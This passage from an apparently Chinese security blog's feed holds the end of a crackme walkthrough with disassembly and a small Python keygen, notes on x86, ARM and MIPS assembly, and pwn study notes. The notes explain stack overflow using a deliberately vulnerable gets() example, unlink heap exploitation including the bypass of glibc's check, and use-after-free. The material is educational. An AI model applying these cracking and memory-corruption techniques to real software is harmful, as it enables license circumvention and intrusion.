E8 C2 3E FD FF           | <span class="keyword">call</span> 去除弹窗.4039AC                        |</span><br><span class="line">0042FAEA | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAED | 8B <span class="number">83</span> E0 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1E0]          | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">ebx</span>+1E0]:<span class="string">"\\癇"</span>=&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FAF3 | E8 <span class="number">60</span> AF FE FF           | <span class="keyword">call</span> 去除弹窗.41AA58                        |</span><br><span class="line">0042FAF8 | 8B <span class="number">55</span> F0                 | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAFB | 8B <span class="number">45</span> F4                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAFE | E8 F9 3E FD FF           | <span class="keyword">call</span> 去除弹窗.4039FC                        |</span><br><span class="line">0042FB03 | <span class="number">75</span> 1A                    | <span class="keyword">jne</span> 去除弹窗.42FB1F                         |</span><br><span class="line">0042FB05 | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FB07 | B9 CC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,去除弹窗.42FBCC                     | 42FBCC:<span class="string">"Congratz !!"</span></span><br><span class="line">0042FB0C | BA D8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBD8                     | 42FBD8:<span class="string">"Good job dude =)"</span></span><br><span class="line">0042FB11 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FB16 | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">eax</span>]:<span class="string">"CRACKED"</span><span class="string">"CRACKED"</span></span><br></pre></td></tr></table></figure><p>到42fac8处，看到调用了<code>ds:[431750]</code>，看上面知道这里存了name首字节运算后的结果。执行完406718后，<code>[ebp-18]</code>处的值变为了4018，正好是<code>&#39;1&#39;*0x29*2</code>的结果，继续执行，可以发现最终生成的序列号为CW-4018-CRACKED，序列号计算到这里就分析完毕了，即：输入一个长度大于等于4的字符串，将其首字符乘以0x29再乘以2，结果前加上”CW-“，后面加上”-CRACKED”，拼接后的字符串就是序列号。</p><p>（微型）注册机2333：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = input(<span class="string">'程序中输入的name（长度大于等于4）：'</span>)</span><br><span class="line"><span class="comment"># 其实只输入首字母就好了2333</span></span><br><span class="line">print(<span class="string">'生成的序列号为：CW-%d-CRACKED'</span> % (ord(s[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">2</span>) )</span><br></pre></td></tr></table></figure><p>最后结果就是这样：</p><p><img src="/2019/04/23/AcidBurn分析/3.png" alt="3.png"></p><p>最后再次膜夜影师傅，简单几句话就让我从一头雾水中走出来~</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-3</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本章以经典的hello world程序解释了在x86、x86-64、ARM、MIPS不同架构下不同编译环境产生的结果的差异</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h4 id="MSVC2010"><a href="#MSVC2010" class="headerlink" title="MSVC2010"></a>MSVC2010</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">    <span class="keyword">push</span> offset $sg3830     <span class="comment">;对应字符串存储地址，笔记中没有记述全部的代码</span></span><br><span class="line">    <span class="keyword">call</span> _printf</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>              <span class="comment">;将栈指针移出，4对应32位字节数</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>汇编语言存在两种语体，Intel以及AT&amp;T，上述汇编语言为Intel语体</p><h4 id="GCC-4-4-1"><a href="#GCC-4-4-1" class="headerlink" title="GCC 4.4.1"></a>GCC 4.4.1</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main    proc <span class="built_in">near</span></span><br><span class="line">var_10  = <span class="built_in">dword</span> <span class="built_in">ptr</span> - <span class="number">10h</span></span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="number">0fffffff0h</span>     <span class="comment">;使esp 16字节对齐</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, offset aHelloWorld        <span class="comment">;"Hello world\n"</span></span><br><span class="line">        <span class="comment">;先用eax存储字符串的地址</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">esp</span> + <span class="number">10h</span> + var_10], <span class="built_in">eax</span>   </span><br><span class="line">        <span class="keyword">call</span> _printf</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span>      <span class="comment">;没有优化</span></span><br><span class="line">        <span class="keyword">leave</span></span><br><span class="line">        <span class="keyword">retn</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><h4 id="GCC-4-7-3-AT-amp-T（常见于UNIX）"><a href="#GCC-4-7-3-AT-amp-T（常见于UNIX）" class="headerlink" title="GCC 4.7.3: AT&amp;T（常见于UNIX）"></a>GCC 4.7.3: AT&amp;T（常见于UNIX）</h4><p>小数点开头的指令为宏，可读性差，忽略宏之后代码如下:</p><p>(markdown不支持AT&amp;T语体代码高亮)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.lc0:</span><br><span class="line">        .string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">        pushl %ebp</span><br><span class="line">        movl %esp, %ebp</span><br><span class="line">        andl $-16, %esp</span><br><span class="line">        subl $16, %esp</span><br><span class="line">        movl $.lc0, (%esp)</span><br><span class="line">        call printf</span><br><span class="line">        movl $0, %eax</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></p><p>Intel与AT&amp;T区别：</p><ul><li>运算表达式书写顺序相反</li><li>AT&amp;T中在寄存器前加%，在立即数前加$，使用圆括号（Intel使用方括号）</li><li>AT&amp;T运算操作符需要声明操作数类型</li><li><ol><li>-q quad(64位)</li></ol></li><li><ol start="2"><li>-l 32位long</li></ol></li><li><ol start="3"><li>-w 16位word</li></ol></li><li><ol start="4"><li>-b 8位byte</li></ol></li><li>……</li></ul><h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><h4 id="MSVC-2012-x64"><a href="#MSVC-2012-x64" class="headerlink" title="MSVC 2012 x64"></a>MSVC 2012 x64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main    proc</span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">rcx</span>, offset flat:$sg2989</span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><p>64位寄存器在32位基础上扩展，仍可用e开头正常使用32位寄存器</p><h4 id="GCC-4-4-6-X64"><a href="#GCC-4-4-6-X64" class="headerlink" title="GCC 4.4.6 X64"></a>GCC 4.4.6 X64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.string</span> <span class="string">"Hello world\n"</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, offset flat:.lc0   <span class="comment">;"hello world"</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>前六个参数保存在寄存器中；对E寄存器使用mov写入时，对应的R寄存器高32位会被置0</p><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h4 id="Keli-6-2013-ARM模式"><a href="#Keli-6-2013-ARM模式" class="headerlink" title="Keli 6/2013 ARM模式"></a>Keli 6/2013 ARM模式</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main</span></span><br><span class="line">        <span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">lr</span>&#125;     <span class="comment">;相当于push，把r4和lr(link register)的值放到数据栈中</span></span><br><span class="line">        <span class="keyword">adr </span><span class="built_in">r0</span>, aHelloWorld     <span class="comment">;将字符串偏移与pc相加，结果存储到r0</span></span><br><span class="line">        <span class="keyword">bl </span>__2printf    <span class="comment">;将下一条指令地址存入lr，将printf()地址写入pc</span></span><br><span class="line">        <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">pc</span>&#125;     <span class="comment">;与stmfd相反，类似popj</span></span><br></pre></td></tr></table></figure><p>ARM的sp寄存器相当于x86架构下的sp/esp/rsp的集合<br><br>ARM的pc相当于x86的ip/eip/rip</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-2</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="最简函数"><a href="#最简函数" class="headerlink" title="最简函数"></a>最简函数</h1><blockquote><p>本章以一个函数<code>int f(){return 123;}</code>在不同指令集下的编译结果，简单描述了指令集间的差异。</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">f:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">123</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f <span class="meta">proc</span></span><br><span class="line">    <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0x7b</span> <span class="comment">; 123</span></span><br><span class="line">    <span class="keyword">bx </span><span class="built_in">lr</span></span><br><span class="line">    <span class="meta">endp</span></span><br></pre></td></tr></table></figure><p>ARM中，r0保存函数返回值，lr保存返回地址（区别于x86的函数栈），bx为跳转指令。</p><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>$<span class="number">31</span></span><br><span class="line">li $<span class="number">2</span>, <span class="number">123</span>     <span class="comment"># 0x7b</span></span><br></pre></td></tr></table></figure><p>j为跳转，$31、$2表示寄存器，根据RISC的特性，赋值语句在转移指令之前执行，因此顺序颠倒。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-1</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CPU简介"><a href="#CPU简介" class="headerlink" title="CPU简介"></a>CPU简介</h1><blockquote><p>一些基本概念：指令码、机器码、汇编语言、寄存器</p></blockquote><p>本书使用的CPU架构：</p><ul><li>x86</li><li>x86-64</li><li>ARM64</li><li>ARM(属于RISC CPU)<blockquote><p>Thumb模式(指令为2字节大小)节省了传统ARM统一指令码长度为4字节的情况下占用空间较大的问题。需要注意Thumb不能封装所有ARM指令，传统ARM的4字节模式可以和Thumb模式同时存在</p><blockquote><p>Thumb-2模式包含了2字节指令和4字节指令，但不是简单的Thumb与ARM的复合，而是一种独立运行模式，应用于iPod、iPhone、iPad应用程序，Xcode编译器默认使用此模式编译</p></blockquote></blockquote></li></ul><p><b>ARM指令集分三类，ARM、ARM64、Thumb(Thumb-2)</b></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假任务笔记</title>
      <link href="/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因为之前已经有一定基础，所以假期的学习重点放在了补充基础知识上，顺便针对性地做了几道有代表性的题，每道题的知识点是很单一的栈溢出/格式化字符串/堆溢出，但是也不算简单到秒杀级别，因为会夹杂一些坑，并且出题人挖的坑一个不剩的全踩到了……</p></blockquote><h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h3><blockquote><p>这部分主要是放一些基础的做题前置知识，以前学过的和新掌握的都放在一起了。</p></blockquote><h5 id="1-汇编、栈溢出"><a href="#1-汇编、栈溢出" class="headerlink" title="1.汇编、栈溢出"></a>1.汇编、栈溢出</h5><p>常见寄存器如图</p><p><img src="http://www.cs.virginia.edu/~evans/cs216/guides/x86-registers.png" alt="Please wait while loading image." title="x86"></p><p>其中重点在于ESP、EBP。esp用于保存栈顶指针，ebp保存栈底（主要和栈帧联系在一起）。<br>下面谈一个栈溢出的前置知识：栈帧</p><ul><li>栈帧实际上就是函数调用的记录。CPU没有多余的寄存器保存多个函数的返回地址，而一旦出现2个以上函数的嵌套调用，外部函数的返回地址以及局部变量等数据就需要临时保存，保存的方法就需要用到栈帧实现。</li><li>栈帧存储在栈上，其本身也按栈结构进行存储。栈帧一块块地存储在栈上，就导致寄存器的ebp不断改变，因此ebp也需要在函数调用的时候压入栈帧保存。栈帧的实际结构如下：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/5418798-1c45c860220f0dfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="Please wait while loading image." title="栈帧"></p><ul><li>在生成栈帧时，先将返回地址压入栈中，再压入ebp。设想，程序设计者开辟了一个数组用于保存用户输入，运行时这个数组对应的空间位于图中ebp的上部，此时，若程序未对用户输入做长度鉴定，用户此时输入了一个大于数组大小的字符串，系统不会自动为输入做出检查，只会按事先写好的步骤，将字符串一点点存入栈中，多出来的部分同样会被存入，而预留的空间已经不足，这种情况下溢出就发生了。多余的字符串会按顺序覆盖掉栈上的ebp、返回地址，导致返回地址异常，从而使程序崩溃。</li></ul><h5 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h5><p>做pwn题不太强调逆向能力，一般只需要使用IDA反汇编，大致阅读，或者干脆F5反编译直接阅读C代码，理清代码的大致思路即可。在一些题目中，出题者会实现写好获取flag的函数，但并不在main中使用，此时还需要在IDA中查看左侧函数表，观察是否有这类和shell直接相关的未调用函数（也可使用r2的aa功能）。<br>为了查看程序所开启的保护，可使用checksec（随pwnlib安装）来查看。<br>为了写exp，python的pwn库基本是必不可少的（其实直接用C程序写exp更直接，也并不麻烦，只是pwn用的人越来越多，集成的功能也越来越多，基本没有人用C写了）。pwn中最基础的操作，如recv()、process()、interactive()、p32()、sendline()等等，只需简单使用一遍就可以上手，pwn的其他的功能则需要多看官方说明（如直接生成shellcode等等）。</p><h5 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h5><p>由于堆的内容很多，我也只是研究了一部分，没办法写一个总结，就先把学习的视频链接贴上来了……原视频是在YouTube上的，为了不用每次特意挂梯子去看视频，我把视频搬运到B站了。<a href="https://www.bilibili.com/video/av43948832/" target="_blank" rel="noopener">链接</a></p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><blockquote><p>主要是栈溢出，格式化字符串的原理比较简单，月刊里写得很详细了。</p></blockquote><h5 id="1-栈溢出"><a href="#1-栈溢出" class="headerlink" title="1.栈溢出"></a>1.栈溢出</h5><p>结合栈帧的知识，栈溢出实际上就是构造一个输入，使输入的内容恰好覆盖到ebp下面的返回地址上，这样当函数返回时就会按攻击者输入的地址返回，返回地址会被存储到eip中，也就是程序将要执行的下一条指令。</p><p><img src="https://upload-images.jianshu.io/upload_images/5418798-738c7fdf09073b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/946" alt="Please wait while loading image." title="stack overflow"></p><p>例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>C语言课上老师提到过gets()函数并不好，不推荐使用，因为gets()不会对输入做出长度检测，因此很容易导致栈溢出。上面的代码由于在vulnerable()中使用了gets()，因此攻击者可以通过构造一个字符串，将它的返回地址覆盖为success()的首地址，这样在vulnerable()返回后会在屏幕上输出”You already controlled it.”现代操作系统已经实现了多种缓解栈溢出攻击的方法，如canary保护、NX保护、ASLR等机制，上述代码也只有在编译器关闭了众多保护机制的前提下才能实现简单的栈溢出攻击，否则需要各种机制的应对措施来绕过机制，使得栈溢出的利用受限。<br>假期还大致学习了NX、ASLR的绕过，参考的<a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">SploitFun</a><br>关于栈溢出的介绍内容补充见i春秋月刊</p><h5 id="2-堆溢出"><a href="#2-堆溢出" class="headerlink" title="2.堆溢出"></a>2.堆溢出</h5><p>堆溢出的原理和栈溢出相同，但由于堆的chunk结构复杂，并且一般在堆中没有返回地址，因此堆溢出之后的利用也相对复杂。大致思路（以unlink溢出为例），是仿照chunk的格式，计算偏移，在chunk的data后面再手动写上一个prev_size、chunk_size以及fd、bk指针，以此达到伪造一个堆块的效果，随后写入的shellcode会覆盖掉free()的GOT地址。之后，若程序要调用free()，就会实际上执行shellcode，实现攻击者的目的。</p><ul><li>unlink</li></ul><p>假设堆上有若干个chunk：chunk0、chunk1、chunk2、chunk3<br>四个chunk都正在使用，这时我们正常free掉chunk2<br>之后chunk2的size后面多了fd、bk，并且chunk2指针存入bin中<br>假设chunk1可以溢出，那么就可以通过chunk1溢出到chunk2，修改chunk2的fd、bk<br>把fd修改为[目标地址-12]，bk修改为目标值（任意地址写的地址，和写进去的值）</p><p>再free掉chunk1，因为chunk1的bk指向chunk2，fd指向chunk0，而只有chunk2是freed chunk<br>所以触发了unlink机制，unlink机制要对<strong>chunk2</strong>进行操作，以合并chunk1和chunk2</p><p>这里FD、BK指的是<strong>被unlink的</strong>chunk的fd、bk指向的chunk<br>此时unlink认为chunk2的FD为[目标地址-12]<br>同理，unlink认为chunk2的BK为目标值</p><p>确认了FD和BK，unlink将会进行双向链表的节点删除处理<br>unlink会执行 ：</p><ol><li>FD-&gt;bk = BK，unlink为了确定bk，需要通过chunk2的指针来计算（计算方法为FD加上3倍的size字段大小，32位下为12），而FD=[目标地址-12]所以FD-&gt;bk就相当于目标地址，unlink要把BK赋值给目标地址，此时，目标值就复制到了目标地址</li><li>BK-&gt;fd = FD，同理，BK-&gt;fd需要加2倍的字段大小，32位下是8，因此unlink将[目标地址-12]复制到了[目标值+8]，貌似没什么用，前一步已经完成了这个操作。</li></ol><p>现代glibc为了应对上述情况的发生，在unlink前加了一个检测步骤，即检测P-&gt;fd-&gt;bk是否指向P，P-&gt;bk-&gt;fd是否指向P（P为chunk2）<br>把前面构造的fake chunk带入这个检测，FD-&gt;bk指向的是目标地址，不是P，不能通过检测<br>因此为了应对检测，需要改变改写的fake chunk的fd和bk</p><p>详细解释下unlink后的操作：</p><p>（P_ptr是需要事先获取的）<br>在这里将chunk2的fd设置成chunk2指针减去12（FD = P_ptr - 12），fd设置成chunk2指针减去8（BK = P_ptr - 8）<br>这里的FD、BK是unlink认为的，不是正常理解下的chunk1和chunk3</p><p>这样设置之后，unlink前的指针检查就会变为如下：<br>unlink计算FD-&gt;bk时，会使用FD，把FD加上12，而伪造的FD实际上是P_ptr - 12，计算后得到P_ptr，也就是指向chunk2的指针<br>同理BK-&gt;fd经过计算也会得到指向chunk2的指针<br>这样伪造的fd bk就通过了unlink前的检查，chunk2将会被unlink，合并到chunk1</p><p>按之前提到过的unlink的执行步骤进行：</p><ol><li>FD-&gt;bk = BK，刚刚提过，FD-&gt;bk就是chunk2，这个指针存储在bin list中，执行后，指针变为P_ptr - 8</li><li>BK-&gt;fd = FD，这里BK-&gt;fd依然是chunk2，执行后，指针变为P_ptr - 12<br>可以看出，这里的第一步结果被第二部的结果覆盖掉，unlink后的实际结果，仅相当于执行了第二步<br>最终bin list中指向chunk2的指针指向了chunk2 - 12的地址处，这个指针一般存在于BSS段，<br>因此可以通过修改指针对任意地址读写。</li></ol><ul><li>UAF</li></ul><p>UAF，即free后使用，free后未将指针置为NULL，造成悬空（也就是野指针），之后想办法将这块内存再次获取回来，写入值，此时的新指针和野指针同时指向这块内存，也就可以利用野指针来操作这块内存的数据，造成任意读写。<br>举个栗子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stu_id</span><br><span class="line">    <span class="keyword">char</span>* stu_name;</span><br><span class="line">    <span class="keyword">int</span> *()(<span class="keyword">void</span>);</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p><p>假设有符合上述结构体的元素stu0，程序此时要free掉stu0，但是忘记将stu0的指针置空，现在我们有一个stu0的指针了。我们需要想办法再次使用stu0这块内存，最简单的办法就是再通过程序申请一个同样大小的块，此时堆管理器会按照管理机制将刚刚释放掉的stu0再度利用，由此我们得到第二个指向stu0的指针，我们控制这个新指针正常对stu_id和stu_name进行赋值，假设stu_name值为AAAA(0x41414141)，打印野指针的stu_name，就会将stu_name的值解引用打印出0x41414141地址处的值，同理如果是通过野指针调用结构体内部函数，会将该地址解引用劫持控制流到任意地址。</p><h3 